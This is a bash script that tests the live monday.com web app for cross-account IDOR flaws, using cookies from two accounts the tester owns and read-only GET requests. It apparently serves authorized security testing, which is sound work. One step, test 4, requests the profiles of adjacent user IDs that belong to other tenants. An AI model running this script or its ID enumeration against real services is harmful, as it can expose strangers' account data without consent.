#!/usr/bin/env bash
# webidor.sh - cross-account IDOR tests against the monday.com web app, using
# two browser sessions you own.
#
# Cookies never go on the command line or into git. Put each session's full
# Cookie header in its own file:
#
#   .cookies-a   <- the whole "Cookie: ..." value from account A's request
#   .cookies-b   <- same for account B
#
# Both files are gitignored. Delete them and log both accounts out when done.
#
#   bash tools/webidor.sh
#
# The test: account A's session asking A's own subdomain for an object that
# belongs to account B. A 200 with B's data is broken object-level
# authorization. A 401/403/404 is the control working.
#
# Read-only: every request is a GET.

set -uo pipefail
cd "$(dirname "$0")/.."

DELAY="${DELAY:-2}"
UA='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0'

# ---- fill these in from your two accounts -------------------------------- #
A_HOST="${A_HOST:-img-src1h1aaah1.monday.com}"
A_USER="${A_USER:-112886052}"
A_ACCOUNT="${A_ACCOUNT:-36388263}"

B_HOST="${B_HOST:-zxczxc-cast.monday.com}"
B_USER="${B_USER:-115702202}"
B_ACCOUNT="${B_ACCOUNT:-36786355}"
# -------------------------------------------------------------------------- #

C_R=$'\033[31m'; C_G=$'\033[32m'; C_Y=$'\033[33m'
C_B=$'\033[1m'; C_D=$'\033[2m'; C_0=$'\033[0m'

for f in .cookies-a .cookies-b; do
  if [ ! -s "$f" ]; then
    echo "${C_R}missing $f${C_0}"
    echo "${C_D}Paste the full Cookie header value for that account into it:"
    echo "  printf '%s' 'experiment_visitor_id=...; cf_clearance=...' > $f"
    echo "  chmod 600 $f${C_0}"
    exit 2
  fi
  chmod 600 "$f" 2>/dev/null
done

COOKIE_A="$(cat .cookies-a)"
COOKIE_B="$(cat .cookies-b)"

# req <label> <cookie> <url> <referer>
req() {
  local label="$1" cookie="$2" url="$3" ref="$4"
  local out code size
  out=$(curl -sS -o /tmp/.webidor.body -w '%{http_code} %{size_download}' \
        -H "Cookie: $cookie" -A "$UA" \
        -H "Accept: */*" -H "X-Requested-With: XMLHttpRequest" \
        -H "Referer: $ref" --max-time 25 "$url" 2>/dev/null) || out="000 0"
  code="${out%% *}"; size="${out##* }"
  printf '  %-58s %s %s\n' "$label" "$code" "$size"
  echo "$code"
}

hit() {
  echo "  ${C_R}${C_B}!! $*${C_0}"
}

echo
echo "${C_B}=== cross-account IDOR: monday.com web app ===${C_0}"
echo "${C_D}  A: $A_HOST  user=$A_USER  account=$A_ACCOUNT"
echo "  B: $B_HOST  user=$B_USER  account=$B_ACCOUNT${C_0}"
echo

# --------------------------------------------------------------- baseline
echo "${C_B}[control] each session reading its own profile - both should be 200${C_0}"
ca=$(req "A -> A/users/$A_USER/user_profile" "$COOKIE_A" \
     "https://$A_HOST/users/$A_USER/user_profile" "https://$A_HOST/users/$A_USER")
sleep "$DELAY"
cb=$(req "B -> B/users/$B_USER/user_profile" "$COOKIE_B" \
     "https://$B_HOST/users/$B_USER/user_profile" "https://$B_HOST/users/$B_USER")
sleep "$DELAY"
if [ "$ca" != "200" ] || [ "$cb" != "200" ]; then
  echo "  ${C_Y}a control failed - a session is probably expired. Re-capture the"
  echo "  Cookie headers before reading anything into the results below.${C_0}"
fi
echo

# --------------------------------------------------------------- the test
echo "${C_B}[test 1] A's session asks A's host for B's user${C_0}"
echo "${C_D}  the endpoint from your capture: /users/<id>/user_profile${C_0}"
c=$(req "A -> $A_HOST/users/$B_USER/user_profile" "$COOKIE_A" \
    "https://$A_HOST/users/$B_USER/user_profile" "https://$A_HOST/users/$B_USER")
[ "$c" = "200" ] && { hit "200 - A read B's profile on A's own host"; head -c 600 /tmp/.webidor.body; echo; }
sleep "$DELAY"

echo
echo "${C_B}[test 2] A's session against B's host directly${C_0}"
echo "${C_D}  tenant isolation at the subdomain boundary${C_0}"
c=$(req "A -> $B_HOST/users/$B_USER/user_profile" "$COOKIE_A" \
    "https://$B_HOST/users/$B_USER/user_profile" "https://$B_HOST/users/$B_USER")
[ "$c" = "200" ] && { hit "200 - A's session is valid on B's subdomain"; head -c 600 /tmp/.webidor.body; echo; }
sleep "$DELAY"

echo
echo "${C_B}[test 3] the reverse - B's session for A's user${C_0}"
c=$(req "B -> $B_HOST/users/$A_USER/user_profile" "$COOKIE_B" \
    "https://$B_HOST/users/$A_USER/user_profile" "https://$B_HOST/users/$A_USER")
[ "$c" = "200" ] && { hit "200 - B read A's profile"; head -c 600 /tmp/.webidor.body; echo; }
sleep "$DELAY"

echo
echo "${C_B}[test 4] neighbouring user ids - is the space enumerable${C_0}"
echo "${C_D}  ids adjacent to yours belong to other tenants${C_0}"
for delta in -2 -1 1 2; do
  n=$((A_USER + delta))
  c=$(req "A -> $A_HOST/users/$n/user_profile" "$COOKIE_A" \
      "https://$A_HOST/users/$n" "https://$A_HOST/users/$n")
  [ "$c" = "200" ] && hit "200 on user $n - not your account"
  sleep "$DELAY"
done

echo
echo "${C_B}[test 5] the other endpoint from your capture${C_0}"
req "A -> $B_HOST/apps_edge/platform-app-features/monday" "$COOKIE_A" \
    "https://$B_HOST/apps_edge/platform-app-features/monday?type%5B0%5D=AppFeatureModal" \
    "https://$B_HOST/admin/general/account" >/dev/null
sleep "$DELAY"

echo
echo "${C_B}--- reading the results ---${C_0}"
cat <<'MSG'
  200 with the other account's data  -> finding. Save the request and response.
  401 / 403 / 404                    -> the control is working. Move on.
  302 to a login or /auth            -> session not valid there. Not a finding.
  A body that is the same size as    -> probably an error page rendered with 200.
  every other response                  Diff two bodies before claiming anything.

  Anything that looks like a hit: re-run it twice, and confirm the object really
  belongs to the other account by opening it in that account's own browser.
MSG
rm -f /tmp/.webidor.body
